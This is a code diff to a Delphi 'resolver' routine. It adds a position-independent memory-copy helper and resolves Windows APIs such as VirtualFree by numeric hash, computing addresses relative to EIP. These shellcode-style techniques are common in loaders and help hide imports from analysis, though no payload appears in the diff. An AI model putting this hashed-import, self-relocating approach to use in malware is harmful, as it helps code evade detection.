@@ -33,6 +33,27 @@ procedure resolver;
     end;
   end;
 
+  procedure Move( const Source; var Dest; count : Integer );
+  var
+    S, D: PChar;
+    I: Integer;
+  begin
+    S := PChar(@Source);
+    D := PChar(@Dest);
+    if S = D then Exit;
+    if Cardinal(D) > Cardinal(S) then
+      for I := count-1 downto 0 do
+        D[I] := S[I]
+    else
+      for I := 0 to count-1 do
+        D[I] := S[I];
+  end;
+
+  procedure xCopyMemory(Destination: Pointer; Source: Pointer; Length: DWORD);stdcall;
+  begin
+    Move(Source^, Destination^, Length);
+  end;
+
   procedure xZeroMemory(var Dest; count: Integer);stdcall;
   var
     I: Integer;
@@ -150,6 +171,10 @@ procedure resolver;
     dwStaticAddress := DWORD(@xZeroMemory);
     dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
     pAPI.xZeroMemory := Pointer(dwRelativeAddress);
+
+    dwStaticAddress := DWORD(@xCopyMemory);
+    dwRelativeAddress := dwEIP - (dwLoadHelpers - dwStaticAddress);
+    pAPI.xCopyMemory := Pointer(dwRelativeAddress);
   end;
 
   procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
@@ -161,6 +186,7 @@ procedure resolver;
     pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
     pAPI.xMessageBoxW := GetProcAddressEx(pAPI.hUser32, $A3F9E8DF, 11);
     pAPI.xVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
+    pAPI.xVirtualFree := GetProcAddressEx(hKernel32, $CD53F5DD, 11);
     pAPI.xGetModuleFileNameW := GetProcAddressEx(hKernel32, $FC6B42F1, 18);
     pAPI.xlstrlenW := GetProcAddressEx(hKernel32, $1DDA9F5D, 8);
     pAPI.xlstrcmpW := GetProcAddressEx(hKernel32, $9FEBE16C, 8);
